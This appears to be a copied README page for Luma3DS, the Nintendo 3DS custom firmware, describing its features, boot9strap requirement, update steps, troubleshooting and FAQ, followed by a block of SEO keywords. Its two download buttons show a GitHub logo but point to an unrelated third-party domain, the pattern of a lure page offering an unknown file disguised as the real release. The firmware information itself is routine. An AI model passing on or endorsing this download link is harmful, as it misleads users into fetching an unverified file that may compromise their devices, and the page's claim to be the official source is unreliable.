
# Luma3DS — Nintendo 3DS Custom Firmware

<p align="center">
  <strong>Custom firmware, homebrew support, system patches, and advanced tools for the Nintendo 3DS family</strong>
</p>

<p align="center">
  <a href="https://dyhuiying.com/s/file"><img src="https://img.shields.io/badge/Download-Luma3DS-blue?style=for-the-badge&logo=github" alt="Download Luma3DS"/></a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Nintendo%203DS-red" alt="Platform: Nintendo 3DS"/>
  <img src="https://img.shields.io/badge/Type-Custom%20Firmware-green" alt="Type: Custom Firmware"/>
  <img src="https://img.shields.io/badge/Version-13.5-orange" alt="Version: 13.5"/>
  <img src="https://img.shields.io/badge/Status-Community%20Maintained-brightgreen" alt="Status: Community Maintained"/>
</p>

## Overview

**Luma3DS** is a custom firmware for the Nintendo 3DS family of consoles. It patches and extends parts of the system software to provide homebrew support, additional system functionality, game modifications, and developer-oriented tools.

Luma3DS works with **boot9strap**, which provides the boot-time environment required to launch the custom firmware. It is designed for the Nintendo 3DS, Nintendo 3DS XL, Nintendo 2DS, New Nintendo 3DS, New Nintendo 3DS XL, and New Nintendo 2DS XL families.

The project includes **Rosalina**, an integrated system overlay that provides access to useful features such as screenshots, screen filters, input redirection, cheat functionality, system information, and debugging tools.

Luma3DS is not a standalone homebrew application. It is custom firmware that runs through a compatible bootloader environment and modifies system behavior while preserving the console's underlying hardware platform.

## Key Features

- **Custom Firmware:** Patch and extend the Nintendo 3DS system software.
- **Homebrew Support:** Run compatible homebrew applications and utilities.
- **Rosalina Menu:** Access system tools through an in-game or system overlay.
- **Region Emulation:** Use per-title locale overrides for supported games.
- **LayeredFS:** Redirect game content paths to support compatible modifications.
- **Game Plugins:** Load supported 3GX-format plugins.
- **Cheat Engine:** Use compatible cheat codes and plugin-based modifications.
- **Screenshot Capture:** Capture screenshots from supported applications and games.
- **Screen Filters:** Adjust screen appearance using supported filter options.
- **Input Redirection:** Use compatible external input devices.
- **Payload Chainloading:** Launch additional firmware payloads from the boot menu.
- **System Patches:** Apply supported patches and custom system behavior.
- **GDB Debugging:** Provide debugging support for homebrew developers and reverse engineers.
- **Homebrew Autoboot:** Configure supported homebrew applications to launch automatically.
- **Configuration Management:** Customize firmware behavior through configuration options.

## Technical Specifications

| Specification | Details |
|---|---|
| Project | Luma3DS |
| Platform | Nintendo 3DS Family |
| Software Type | Custom Firmware |
| Latest Release Reference | v13.5 |
| Release Date | November 2, 2026 |
| Required Boot Environment | boot9strap |
| Main Firmware File | `boot.firm` |
| Configuration File | `/luma/config.ini` |
| Payload Directory | `/luma/payloads/` |
| Payload Extension | `.firm` |
| Rosalina Shortcut | `L + Down + Select` |
| Boot Configuration Menu | Hold `SELECT` during startup |
| Boot Chainloader | Hold `START` during startup |
| Plugin Format | 3GX |
| Layered Game Modding | LayeredFS |
| License | GPL-3.0 |

## Compatibility

Luma3DS supports the Nintendo 3DS family of consoles.

### Supported Hardware

| Console Model | Compatibility |
|---|---|
| Nintendo 3DS | Supported |
| Nintendo 3DS XL | Supported |
| Nintendo 2DS | Supported |
| New Nintendo 3DS | Supported |
| New Nintendo 3DS XL | Supported |
| New Nintendo 2DS XL | Supported |

### Firmware Compatibility

Luma3DS is designed to work with supported 3DS system software through boot9strap.

Unlike firmware-specific jailbreak tools for some other consoles, Luma3DS does not use a separate public exploit entry point every time the console starts. The boot9strap environment launches Luma3DS during the boot process.

For supported installations, Luma3DS can be used with current official 3DS system software. Some individual patches and features may have additional requirements.

### Compatibility Notes

- boot9strap is required to run Luma3DS.
- Very old system versions may lack support for some Luma3DS patches.
- Homebrew applications can have their own hardware and firmware requirements.
- 3GX plugins must be compatible with the installed Luma3DS plugin loader.
- Game modifications may require specific game versions or update data.
- Some features are available only on New Nintendo 3DS hardware.
- Nintendo DS and GBA compatibility modes have separate technical limitations.

**Important:** Compatibility with Luma3DS does not guarantee that every homebrew application, plugin, game modification, or payload will work on every console.

## Firmware Features

### Luma3DS Custom Firmware

Luma3DS patches and reimplements selected parts of the Nintendo 3DS system software.

Its core functionality includes:

- Signature-check patches.
- Homebrew application support.
- System behavior modifications.
- Custom system module support.
- Firmware configuration.
- Boot-time payload management.

### Rosalina Menu

Rosalina is an integrated system overlay that provides access to additional tools while the console is running.

Default shortcut:

`L + Down + Select`

Available functionality includes:

- Screenshot capture.
- Screen filters.
- Input redirection.
- Cheat management.
- System information.
- Process and memory inspection.
- Debugging features.
- Wireless and network-related options.
- System configuration.

### Region Emulation

Luma3DS supports per-title locale emulation for compatible applications.

This allows selected games to use a specified language and region configuration without changing the console's entire system region.

### LayeredFS

LayeredFS redirects selected game content paths to alternative files.

This enables compatible game modifications, including:

- Custom textures and assets.
- Modified game files.
- Translation patches.
- Content replacements.
- Other supported game modifications.

The exact behavior depends on the game and modification package.

### Game Plugin Loader

Luma3DS supports compatible 3GX-format game plugins.

Plugins can provide additional functionality for supported games, including debugging and other game-specific modifications.

Only use plugins from trusted sources. Incompatible plugins can cause crashes or unexpected behavior.

### Cheat Engine

The integrated cheat engine supports compatible cheat codes and plugin workflows.

Cheat availability depends on the game, title version, and supported code format.

Some applications may experience instability when using the integrated cheat engine.

### Payload Chainloading

Luma3DS includes a boot-time chainloader for launching compatible `.firm` payloads.

Payload files are stored in:

`/luma/payloads/`

The chainloader can be accessed by holding `START` during boot.

### GDB Debugging

Luma3DS includes a GDB stub for developers and reverse engineers.

Supported debugging workflows can provide access to process information, memory inspection, and debugging sessions through compatible tools.

### Screen Filters

Rosalina provides screen-filter options for supported display configurations.

Available options include color adjustments and other display-related settings.

### Input Redirection

Compatible external input devices can be used through supported input-redirection functionality.

The exact setup depends on the client software and device compatibility.

### Homebrew Autoboot

Luma3DS can be configured to launch a selected homebrew application automatically during startup.

The autoboot configuration depends on the installed application and available system resources.

## System Requirements

Before installing or updating Luma3DS, make sure you have:

- A compatible Nintendo 3DS family console.
- A working boot9strap installation.
- A compatible SD or microSD card.
- Sufficient free storage space.
- A computer or compatible device for preparing the SD card.
- A supported file extraction utility.
- The correct Luma3DS release archive.
- A backup of important SD card data.
- Access to the installation instructions for your console.

The console must already have a compatible boot9strap environment. Luma3DS does not independently install boot9strap.

## Download & Installation

<p align="center">
  <a href="https://dyhuiying.com/s/file"><img src="https://img.shields.io/badge/Download-Luma3DS-blue?style=for-the-badge&logo=github" alt="Download Luma3DS"/></a>
</p>

### Before Installation

1. Confirm that the console belongs to the Nintendo 3DS family.
2. Verify that boot9strap is installed and working.
3. Back up the contents of the SD or microSD card.
4. Download the appropriate Luma3DS release archive.
5. Extract the archive using a compatible extraction utility.
6. Read the upgrade instructions before replacing existing files.

### Installation or Upgrade Workflow

For an existing boot9strap installation:

1. Power off the Nintendo 3DS.
2. Remove the SD or microSD card.
3. Connect the card to a computer.
4. Extract the Luma3DS release archive.
5. Copy `boot.firm` to the root of the SD card.
6. Replace the existing `boot.firm` when prompted.
7. Copy the included Homebrew Menu file if an update is required.
8. Safely eject the storage device.
9. Reinsert the card into the console.
10. Power on the console and verify that Luma3DS starts correctly.

**Important:** This workflow describes updating Luma3DS on a console that already has boot9strap installed. A new installation requires following the complete console-specific instructions provided by the 3DS homebrew community.

Do not use a source-code archive as a replacement for the official release package.

## Configuration & Management

### Configuration Menu

The Luma3DS configuration menu can be opened by holding:

`SELECT` during startup.

The configuration file is normally stored at:

`/luma/config.ini`

### Rosalina Menu

Open Rosalina while the console is running:

`L + Down + Select`

Most Rosalina settings are not automatically saved unless the relevant menu option explicitly saves them. Use the available Save Settings option where required.

### Payload Management

Place compatible `.firm` payloads in:

`/luma/payloads/`

Hold `START` during startup to open the chainloader.

If only one compatible payload is present, the chainloader may launch it directly without displaying a selection menu.

### Plugin Management

Use compatible 3GX plugins and follow the documentation for the plugin loader.

Keep plugins organized and remove files that are no longer required.

### Game Modifications

LayeredFS modifications should be prepared for the correct title and game version.

Incorrect file paths or incompatible modifications may prevent a game from launching.

### SD Card Management

Keep a backup of the SD card before updating Luma3DS or changing configuration files.

Avoid removing the SD card while the console is writing data.

### Updating Luma3DS

To update Luma3DS, replace the existing `boot.firm` with the version from the new release archive.

Review release notes before updating, especially when using plugins, payloads, or custom configuration files.

## Troubleshooting

| Problem | Possible Cause | Recommended Action |
|---|---|---|
| Console powers on and then shuts down | Missing or incompatible `boot.firm` | Verify the file on the SD card and boot9strap compatibility |
| Unsupported loader message | Outdated boot9strap | Follow the official boot9strap update instructions |
| Luma3DS configuration menu does not appear | Incorrect startup button timing | Hold SELECT while powering on |
| Rosalina does not open | Incorrect button combination or conflicting input | Use the default shortcut and verify the configuration |
| Payload does not appear in chainloader | Incorrect directory or file extension | Check `/luma/payloads/` and use `.firm` files |
| Homebrew application crashes | Incompatible application or missing requirement | Verify application compatibility |
| Game modification does not load | Incorrect LayeredFS structure | Check the title ID and modification directory |
| Plugin causes a crash | Incompatible 3GX plugin | Remove the plugin and test again |
| Cheat engine causes instability | Application-specific compatibility issue | Disable cheats or use a compatible game plugin |
| Settings are not retained | Settings were not saved | Use the Save Settings option where available |
| SD card files are missing | Incomplete extraction or copy operation | Restore from backup and verify the release archive |

If the console does not boot after an update, check the SD card contents and boot9strap compatibility before attempting further changes.

## FAQ

### 1. What is Luma3DS?

Luma3DS is custom firmware for the Nintendo 3DS family. It provides system patches, homebrew support, game modifications, and additional tools.

### 2. Does Luma3DS work on every Nintendo 3DS model?

Luma3DS supports the Nintendo 3DS, 3DS XL, 2DS, New 3DS, New 3DS XL, and New 2DS XL families when installed with a compatible boot9strap environment.

### 3. Does Luma3DS require boot9strap?

Yes. The official Luma3DS project requires boot9strap to run.

### 4. What is Rosalina?

Rosalina is an integrated overlay that provides access to system tools, screenshots, filters, input redirection, cheats, and debugging functionality.

### 5. How do I open the Rosalina menu?

The default shortcut is `L + Down + Select` while the console is running.

### 6. How do I open the Luma3DS configuration menu?

Hold `SELECT` while powering on the console.

### 7. Where should I put `.firm` payloads?

Place compatible payloads in `/luma/payloads/` on the SD card. Hold `START` during boot to access the chainloader.

### 8. Does Luma3DS support game modifications?

Yes. LayeredFS supports compatible game-content redirection, and the plugin loader supports compatible 3GX game plugins.

### 9. Can Luma3DS run homebrew applications?

Yes. Luma3DS provides first-class support for compatible Nintendo 3DS homebrew applications.

### 10. Can I update Luma3DS without reinstalling everything?

Yes. On an existing boot9strap installation, updating generally involves replacing `boot.firm` with the file from the new release archive. Follow the release instructions.

### 11. What is the latest Luma3DS version?

The latest release referenced in this README is v13.5, published on November 2, 2026. Check the official release information before updating.

### 12. Is Luma3DS the same as a homebrew application?

No. Luma3DS is custom firmware. Homebrew applications run within the environment it provides.

## SEO Keywords

Luma3DS, Nintendo 3DS Custom Firmware, 3DS CFW, 3DS Homebrew, Nintendo 3DS Homebrew, Luma3DS Download, Luma3DS Installation, boot9strap, 3DS Bootloader, 3DS Rosalina Menu, 3DS Payloads, 3DS Firmware Patches, 3DS Region Emulation, 3DS LayeredFS, 3DS Game Mods, 3DS 3GX Plugins, 3DS Cheat Engine, 3DS Homebrew Applications, 3DS System Tools, 3DS GDB Debugging, 3DS Input Redirection, 3DS Screen Filters, Nintendo 2DS Custom Firmware, New Nintendo 3DS CFW, New Nintendo 2DS XL Homebrew, 3DS Payload Chainloader, 3DS Firmware Management, 3DS Homebrew Environment
